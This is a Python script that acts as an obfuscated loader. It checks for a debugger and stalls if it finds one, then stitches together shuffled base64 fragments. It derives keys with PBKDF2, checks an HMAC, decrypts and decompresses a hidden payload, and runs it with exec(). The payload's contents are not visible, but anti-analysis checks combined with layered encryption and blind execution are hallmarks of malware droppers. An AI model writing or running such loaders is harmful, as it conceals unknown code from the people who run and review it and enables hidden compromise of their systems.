import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_cb50dc_0 = 'N7KV0NVWRqYNDG4b/dFxOi3bttwAxzQjCB45VmCBzTgrmUJaV+uO4ViF43xDsC'
_cb50dc_1 = '8Fz/9foLwKZfyT/5tCEv3'
_cb50dc_2 = 'Vu+q3ZcTBMskJVG2/FZeKgryyEATOjQlQ7WWTzLw98Gsz+542RxZeLVcLuJ7dj'
_cb50dc_3 = 'hRbox+CXFxSKFzmTYeU/89rXZqN25ihF1qeFrEJ6RmrpAXfKxczPbaf+USUlRR'
_cb50dc_4 = 'CN34CZv4OklnePUtBmNtFFHnMv3xSM/iR7uEqyT6uX'
_cb50dc_5 = 'RpONNv+7IxCf3Q6+Pzh3RJdYEG90xa6C'
_cb50dc_6 = 'rP44GBM0KfXzg24qb828eR5KK'
_cb50dc_7 = 'MLscw2+2UfTqQ3IXVdbOLdK+0Tv8RpyQYDGhlGgu2YTrmq385HcPOEJ5'
_cb50dc_8 = 'tEOjFKTfhJ0fyyIh/fXO7431kJtAP5nbeoqRKcT6CWKpjC'
_cb50dc_9 = 'z3HGde5a+rEzZYDOo4xNxWt'
_cb50dc_10 = 'NsSt1f0EOQK4ptzsZ0/fcyb0/gK/oSrd62NyCAaNgsVeHPeMnGW3qCE0Qm4Y'
_cb50dc_11 = 'S1Jjmn3mc39ogWhxZABl6br+Ma9/qqJBPm7Q2gMd1S7hxrZ0cPxxpP0t'
_cb50dc_12 = 'NyfwcStt9k9Uk6caHXhMEtEA'
_cb50dc_13 = '5ymxQoVDfnJHZsg4lKq6'
_cb50dc_14 = 'CanQ2p1CEN9Lomnp6Bny0lxqt+oJZgDB'
_cb50dc_15 = 'lJEQfoMOMJ/ZU88FrnX/W3fe6G1YPBf'
_cb50dc_16 = 'zMzH/OZTqa53oNC+DQT6ZskBKJ8g+ZxXwINq'
_cb50dc_17 = 'st/tWdtVQYJJ+/1L9FJ49wXg69CtahgoYTF+a79aCSmhcEa/bUyyq'
_cb50dc_18 = '2oGn42nwO4q2LUeIn6d00gZOKXygkbPYStj+qPMxkzHB69PzfO3Z'
_cb50dc_19 = 'BtWlfZ6dWK05klfnD6gi/mMgBXuELShNP4F92'
_cb50dc_20 = 'GdBM4F3hvNkh+zR9twofKBWBC7RfDYAPpHtH0Q7'
_cb50dc_21 = 'qbFWltSGEqDE7YLWcqqWASz5x7+GTOU9i7RLhcyYxZsvRY1TncafUP3M3VJsW'
_cb50dc_22 = 'vH54uZgrtD5/3Y5iPMwNCrJ5l1sx5POjn7tZi6AXEZEZ0l'
_cb50dc_23 = '1PB10sOHxne81/I7UaRAwAEYWZNbV3F'
_cb50dc_24 = 'rB9RNghuM7q9jRdt0XXXdDN/o'
_cb50dc_25 = 'VBboWuig0vav4uKF0yr+tVtA3i'
_cb50dc_26 = 'VT+TILM9MvpmTGsic7+raZxzqiT221NyTSBl'
_cb50dc_27 = 'tTxTfyy8aV6z1juOmMP9h9JRnkIXJEmtz/pufiVLM5TD'
_cb50dc_28 = '1R4ETSCziDaYt2DGjWExI1TJoBGr7kl28vjGU'
_cb50dc_29 = '1F6PrhEQPANjkyaqfUqhG'
_cb50dc_30 = 'TygjrLQ/5WMUYoFqgtcGC/n+nRSBVW5in'
_cb50dc_31 = 'ddEL4IThQOsPivNxcQU63b95SopVZgoTX'
_cb50dc_32 = 'rB6nyVm6yi2yYshlntiERpPT7pQLHBk0TDw7wlkpQFu9ypi6zu0rnyfu'
_cb50dc_33 = 'zI9vJZhrSKSWVXzRf3V9/77jb'
_cb50dc_34 = 'eE6/epR2iuvBBS7PqdqVUlOKRW77Bk2X'
_cb50dc_35 = '82Bwv12ioUndA3MvmtYbH95BXpYWm0yd5V6l56HOb'
_cb50dc_36 = '+u1kAkQy2TU8s3X87+/jqfYEvzfLwMQS6'
_cb50dc_37 = 'NuPNkjAcVulT1dyGfpSODiMmTNA4'
_cb50dc_38 = 'OLYqiGE5CseZxBIkRtDc0c8/uupK6WIZzpzN2OASi6hH+qRAdgjE'
_cb50dc_39 = 'RNV8/1j9o5PlEar3mC+ZaQlRpNRm4goTK76'
_cb50dc_40 = 'tNb9atiLzdijG4i4v0r3cUG'
_cb50dc_41 = 'Oyj6ofXbrPC/gmDrnw/5nrwPY7ezhpEh/KyZfMGc1xlOLxZltz7DZm31L'
_cb50dc_42 = 'pIdC6Pk8qfePLW0TJhMW5e+7Dcxqf7O0ZhwyfwA2lxkYhVt9KXnY5DKpK'
_cb50dc_43 = 'P3KfBhFF5gU8naEGk8kk1RoIZ3NRjFjrTbbJ/QGN1nIfDnkOy3pLI4cPlDNkhWrJ'
_cb50dc_44 = 'AF+Bg2J/7ou5bR+oG+orVcwPa03uZBE8Wf0hcRKzgicBizDnFyERHqZOdamN'
_cb50dc_45 = 'uld66uTLUlXypqlhClYvvXPwVrhK6i'
_cb50dc_46 = 'efLME0bpyOGlr6RrdNh34me6'
_cb50dc_47 = 'XYAfBZn2Tt4S07UHzqzvLlgjg8mhgC'
_cb50dc_48 = 'OxOQpdbbs67GSTG+pyiEAsz0tNiHCwx199VUCHeuaGsyQ6HtHQOLzMutBWswG'
_pls = [_cb50dc_0, _cb50dc_1, _cb50dc_2, _cb50dc_3, _cb50dc_4, _cb50dc_5, _cb50dc_6, _cb50dc_7, _cb50dc_8, _cb50dc_9, _cb50dc_10, _cb50dc_11, _cb50dc_12, _cb50dc_13, _cb50dc_14, _cb50dc_15, _cb50dc_16, _cb50dc_17, _cb50dc_18, _cb50dc_19, _cb50dc_20, _cb50dc_21, _cb50dc_22, _cb50dc_23, _cb50dc_24, _cb50dc_25, _cb50dc_26, _cb50dc_27, _cb50dc_28, _cb50dc_29, _cb50dc_30, _cb50dc_31, _cb50dc_32, _cb50dc_33, _cb50dc_34, _cb50dc_35, _cb50dc_36, _cb50dc_37, _cb50dc_38, _cb50dc_39, _cb50dc_40, _cb50dc_41, _cb50dc_42, _cb50dc_43, _cb50dc_44, _cb50dc_45, _cb50dc_46, _cb50dc_47, _cb50dc_48]
_dc2157 = [(40606,36593,2),(27161,14150,2),(63093,52661,2),(9795,23234,2),(44880,8792,2),(13324,57514,2),(61132,6244,2),(55498,9878,2),(36903,42891,2),(33565,42582,2),(63486,15284,2),(57353,50270,2),(39577,14095,2),(14202,36483,2),(39526,55348,2),(6927,41194,2),(0,0,0),(0,0,0)]
_7f5fc4 = 'EG9dXw=='
_0f3419 = '5D10/SH5sIb4jPgK'
_9681a2 = 'iIvSndNmtdo='
_1bfdb9 = [25, 26, 16, 32, 3, 22, 36, 39, 42, 4, 13, 23, 21, 1, 19, 15, 28, 12, 14, 44, 10, 35, 24, 20, 6, 29, 5, 40, 31, 9, 34, 30, 41, 48, 11, 37, 8, 45, 27, 7, 17, 2, 38, 18, 33, 46, 43, 47, 0]
_salt = base64.b64decode(_9681a2)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _1bfdb9
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_415453 = base64.b64decode(_assembled)
_2eff19 = 32
_7425c4 = _415453[:-_2eff19]
_2eff19 = _415453[-_2eff19:]
_0357a4 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_dc2157)
_hdr = base64.b64decode(_7f5fc4)
_nonce = base64.b64decode(_0f3419)
_km_seed = hashlib.sha256(_0357a4 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _7425c4, hashlib.sha256).digest()
if _calc_tag != _2eff19:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_7425c4)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_7425c4, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_4508f8'] = mmap
globals()['_af158e'] = lambda i: globals()['_4508f8'][str(i)]
_x = globals()['_af158e']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
